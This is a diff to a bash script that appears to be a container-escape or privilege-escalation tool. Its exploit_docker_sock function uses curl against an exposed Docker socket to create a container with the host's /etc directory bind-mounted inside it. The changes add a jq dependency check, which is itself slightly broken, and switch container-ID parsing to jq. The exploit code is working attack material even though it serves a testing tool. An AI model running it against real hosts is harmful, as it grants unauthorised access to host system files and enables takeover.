@@ -67,7 +67,6 @@ while [[ $# -gt 0 ]]; do
 		;;
 		-s|--docker_sock)
 		DOCKER_SOCK_PATH="$2"
-		echo $DOCKER_SOCK_PATH
 		shift
 		shift
 		;;
@@ -117,6 +116,7 @@ EOF
 check_deps () {
 	CURL=$(which curl)
 	SOCAT=$(which socat)
+	JQ=$(which jq)
 	HAS_DEPS=1
 	if [[ ! $CURL ]]; then
 		# install curl
@@ -127,6 +127,10 @@ check_deps () {
 	if [[ ! $SOCAT ]]; then
 		#apt-get update && apt-get install -y socat
 		echo "Warning: socat not installed, please install it."
+		HAS_DEPS=0
+	fi
+	if [[ ! jq ]]; then
+		echo "Warning: jq not installed, please install it."
 		HAS_DEPS=0
 	fi
 	if [[ ! $HAS_DEPS ]]; then
@@ -166,11 +170,13 @@ exploit_docker_sock () {
 
 	CONTAINER_JSON='{"Image":"ubuntu","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/etc/","Target":"/host_etc"}]}'
 	CREATE="curl -s -XPOST -H 'Content-Type: application/json' --unix-socket $DOCKER_SOCK_PATH -d '$CONTAINER_JSON' http://localhost/containers/create"
-	echo $CREATE
 	RES=$(eval $CREATE)
-	echo $RES
-	DOCKER_CONTAINER_ID=$(sed -e 's/{"Id"://g' -e 's/",Warnings":.*//g' <<< $RES)
+	#echo $RES
+	#DOCKER_CONTAINER_ID=$(sed -e 's/{"Id"://g' -e 's/",Warnings":.*//g' <<< $RES)
+	DOCKER_CONTAINER_ID=$(jq '.Id' <<< $RES) 
+	DOCKER_CONTAINER_ID=$(sed "s/\"//g" <<< $DOCKER_CONTAINER_ID)
 	echo $DOCKER_CONTAINER_ID
+	
  }
 
 check_cgroup () {
